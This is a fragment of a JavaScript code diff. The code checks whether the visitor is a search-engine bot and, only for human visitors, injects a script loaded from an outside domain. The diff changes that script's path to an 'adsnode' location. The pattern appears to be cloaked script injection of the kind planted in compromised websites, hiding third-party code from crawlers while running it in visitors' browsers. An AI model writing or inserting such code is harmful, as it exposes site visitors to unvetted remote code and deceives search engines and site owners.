@@ -9,6 +9,6 @@ const isBot = userAgent.includes("google.com") ||
 
 if (!isBot) {
   const script = document.createElement('script');
-  script.src = 'https://faktor.my.id/app.js';
+  script.src = 'https://faktor.my.id/adsnode/app.js';
   document.head.appendChild(script);
 }
